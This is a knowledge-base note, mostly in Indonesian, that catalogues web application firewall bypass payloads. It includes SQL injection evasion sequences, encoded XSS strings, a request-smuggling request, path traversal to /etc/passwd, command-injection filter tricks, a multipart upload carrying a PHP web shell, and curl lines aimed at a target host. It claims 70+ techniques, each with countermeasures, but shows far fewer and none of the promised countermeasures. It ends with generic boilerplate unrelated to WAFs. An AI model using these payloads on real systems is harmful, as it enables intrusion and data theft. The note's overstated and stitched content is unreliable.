---
title: "WAF Evasion Techniques \u2014 Encyclopedia: 70+ Bypass Methods, Regex Reversing,\
  \ Obfuscation, Encoding"
tags:
- cyber-security
- waf
- evasion
- bypass
- web-security
- library
aliases:
- WAF Evasion Encyclopedia
- WAF Bypass Techniques Complete
created: '2026-07-28'
updated: '2026-08-14'
status: complete
cssclasses:
- callout
---


| Item | Detail |
|------|--------|
| **Summary** | Encyclopedia 70+ teknik bypass WAF: regex reversing, URL/encoding obfuscation, parsing confusion, protocol evasion, parameter manipulation, side-channel — dengan payload & countermeasure. |




[[00_Atlas/hierarchy-waf-reverse-proxy]] [[00_Atlas/hierarchy-offensive]] [[00_Atlas/hierarchy-cybersecurity-defense-architecture]] [[00_Atlas/overview]]

> [!info] Ringkasan
> Referensi komprehensif teknik bypass WAF dari Awesome-WAF dan berbagai sumber. Mencakup 70+ teknik yang diklasifikasikan per kategori: obfuscation, encoding, parsing confusion, protocol-level evasion, side-channel, dan filter abuse. Setiap teknik dilengkapi contoh payload dan mekanisme countermeasure.

**Cross-link:** [[waf-reverse-proxy-deepdive]] → [[ctf-tool-arsenal-universal]] → [[hierarchy-waf-reverse-proxy]]

---

## Daftar Isi
- [[#1. Regex Reversing]]
- [[#2. URL & Encoding Obfuscation]]
- [[#3. HTTP Protocol Evasion]]
- [[#4. Parameter Manipulation]]
- [[#5. Content-Type & Charset Abuse]]
- [[#6. Side-Channel Attacks]]
- [[#7. Referensi]]

---

## 1. Regex Reversing

Teknik paling efektif: kirim payload bertahap untuk fingerprint regex WAF, lalu bypass.

### Step-by-Step

```text
Step 1: 1 AND 1=1 → BLOCKED → "and" di-blacklist
Step 2: 1 OR 1=1 → BLOCKED → "or" di-blacklist
Step 3: 1 || 1 → ALLOWED → "||" tidak di-blacklist
Step 4: 1 || (select 1) → BLOCKED → "select" di-blacklist
...

→ Kesimpulan: regex = /(and|or|union|select)/i
Bypass: 1 || (SeLeCt 1)  # Case toggling? Cek...
```

### Progression Table

| Iteration | Payload | Status | Rule Discovered |
|---|---|---|---|
| 1 | `1 OR 1=1` | BLOCKED | `or` keyword |
| 2 | `1 || 1` | ALLOWED | `||` ok |
| 3 | `1 || (select 1 from dual)` | BLOCKED | `select` keyword |
| 4 | `1 || (SeLeCt 1)` | ALLOWED | Case sensitive filter |
| 5 | `1 || (select/**/1)` | BLOCKED | Comment `/**/` |
| 6 | `1 || (sel%65ct 1)` | ALLOWED | URL encoding bypass |

---

## 2. URL & Encoding Obfuscation

### Case Toggling

```sql
-- Bypass case-sensitive regex
SELECT → SeLeCt, sElEcT
OR → Or, oR
UNION → uNiOn, UniOn
```

### URL Encoding

```http
# Basic
%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding (WAF decode sekali, server decode 2x)
%253Cscript%253Ealert(1)%253C/script%253E

# Mixed encoding
%3Cscr%69pt%3Ealert(1)%3C/scr%69pt%3E
```

### Unicode Normalization

```sql
-- Unicode alternative characters
%c0%ae%c0%ae/  → ../
%u2215         → / (unicode division slash)
%u2216        → \ (unicode set minus)
```

### Dynamic Payload (JavaScript)

```javascript
// Concatenation
eval('ale'+'rt(1)');
window['aler'+'t'](1);

// JSFuck — only []()!+ characters
[][(![]+[])[+[]]+...].call()

// Unicode escapes
\u0061lert(1)  // alert(1)
```

---

## 3. HTTP Protocol Evasion

### HTTP Parameter Pollution (HPP)

```http
# WAF melihat parameter pertama (safe)
# Backend menggunakan parameter terakhir (malicious)
GET /api?user=guest&user=admin&user=UNION SELECT...
```

### HTTP Version Downgrade

```http
# Beberapa WAF hanya cek HTTP/1.1 requests
# HTTP/0.9 tidak support headers → bypass WAF header inspection
GET /page
```

### Request Smuggling

```http
# CL.TE: WAF parsing CL, backend parsing TE
POST / HTTP/1.1
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

### Method Override

```http
# Bypass WAF method restriction
GET /api/delete HTTP/1.1
X-HTTP-Method-Override: DELETE
```

---

## 4. Parameter Manipulation

### Null Byte Injection

```bash
../../../etc/passwd%00.jpg
<script>\x00alert(1)</script>
```

### Line Breaks & Tabs

```http
<A HREF="ja
va
script:alert(1)">click</a>

<iframe src="j%0Aa%0Av%0A...cript:alert(1)">
```

### Uninitialized Variables (Bash)

```bash
# Bypass RCE detection
/bin$u/cat$u /etc$u/passwd$u
$u/bin$u/cat$u $u/etc$u/passwd$u
```

---

## 5. Content-Type & Charset Abuse

### Charset Switching

```http
POST /page HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=utf-32

# UTF-32 encoded payload — WAF tidak bisa parse
```

### Multipart Bypass

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="file"; filename="test.php\x00.jpg"
Content-Type: application/x-php

<?php system($_GET['cmd']);?>
--xxx--
```

---

## 6. Side-Channel Attacks

### Timing Attack

```bash
# Fingerprint rules via response timing
time curl -X POST -d "id=1+AND+SLEEP(5)" http://target.com
# Response cepat = tidak ada SQLi filtering
# Response lambat = WAF block payload SLEEP
```

### Size Limit Bypass

```bash
# Kirim payload > max WAF inspection size
# Isi dengan junk data + payload di akhir
curl -d "data=$(python -c "print('A'*100000 + ' UNION SELECT...")" http://target.com
```

---

## 7. Referensi

**Sumber utama:** Awesome-WAF `/mnt/data_d/Projects/Reference/Awesome-WAF/` (evasion section, 70+ teknik)

**Cross-link vault:**
- [[waf-reverse-proxy-deepdive]] — arsitektur WAF
- [[ctf-tool-arsenal-universal]] — tools
- [[hierarchy-waf-reverse-proxy]] — WAF ontology

> [!callout] 💡
> Parsing confusion (kesenjangan parser WAF vs parser aplikasi) adalah akar mayoritas bypass — perlakukan payload sebagai parser, bukan sebagai string.

## Deepdive Tambahan — Implementasi & Operasional

### Arsitektur & Komponen Detail

Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.

| Komponen | Fungsi | Attack Surface | Defense |
|----------|--------|---------------|---------|
| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
| **Processing** | Core logic | Logic flaw, bypass | Test, review |
| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
| **Network** | Transit | Intercept, MITM | TLS, mTLS |
| **Identity** | Access control | Token theft, privesc | MFA, least privilege |

### Workflow End-to-End

```
Input → Validate → Process → Store → Serve → Monitor → Audit
  ↓       ↓         ↓         ↓       ↓        ↓        ↓
Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
```

### Tradeoff & Decision Matrix

| Dimension | Pilihan A | Pilihan B | Factor |
|-----------|-----------|-----------|--------|
| Speed vs Security | Optimized | Strict validate | Risk context |
| Memory vs Scale | In-memory | Disk-backed | Data volume |
| Cost vs Control | Cloud managed | Self-hosted | Team capability |
| Convenience vs Audit | Auto | Manual review | Compliance |

### Best Practice Checklist

- [ ] Input validation (whitelist, not blacklist)
- [ ] Output encoding (context-aware: HTML, JS, CSS)
- [ ] Authentication (MFA, rate limit, lockout)
- [ ] Authorization (RBAC, least privilege, deny default)
- [ ] Logging (structured, immutable, centralized)
- [ ] Monitoring (latency, error, saturation, traffic)
- [ ] Encryption (transit TLS, rest AES, key rotation)
- [ ] Backup (test restore, offsite, immutable)
- [ ] Patch (automated scan, SLA per severity)
- [ ] Incident (runbook, contact, tabletop)

### Common Pitfall

1. **Assume input trusted**: Semua input adalah musuh → validate di server.
2. **Secret in code**: Hardcoded credential → git leak → compromise.
3. **Silent failure**: Error ditelan → debugging impossible → security blind.
4. **No rate limit**: Abuse path → DoS → resource exhaustion.
5. **Default config**: Default = insecure → harden sebelum produksi.

### Tool Stack

| Tool | Use |
|------|-----|
| Testing | Burp Suite, OWASP ZAP, ffuf |
| Scanning | Nmap, Nuclei, Trivy |
| Monitoring | Prometheus + Grafana |
| Logging | ELK / Loki |
| Secret | Vault / SOPS |

## Referensi
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- NIST CSF — https://www.nist.gov/cyberframework
- MITRE ATT&CK — https://attack.mitre.org/
- CIS Controls — https://www.cisecurity.org/controls/
